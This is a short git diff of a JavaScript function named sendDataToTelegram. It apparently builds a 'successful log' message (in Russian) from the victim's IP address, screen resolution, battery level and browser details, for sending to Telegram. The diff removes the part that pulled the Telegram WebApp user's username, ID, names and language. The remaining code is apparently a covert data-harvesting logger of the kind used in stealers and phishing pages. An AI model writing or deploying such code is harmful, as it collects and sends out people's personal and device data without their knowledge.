@@ -37,18 +37,9 @@ async function sendDataToTelegram() {
     const screenResolution = getScreenResolution();
     const batteryPercentage = await getBatteryPercentage();
     const browserInfo = getBrowserInfo();
-    let tg = window.Telegram.WebApp;
 
     const message = `
 <b>✨ Лог успешен!</b>
-
-<b>🔍 Информация об аккаунте:</b>
-├ Тэг: @${tg.initDataUnsafe.user.username}
-├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
-├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
-├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
-├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
-└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
 
 <b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
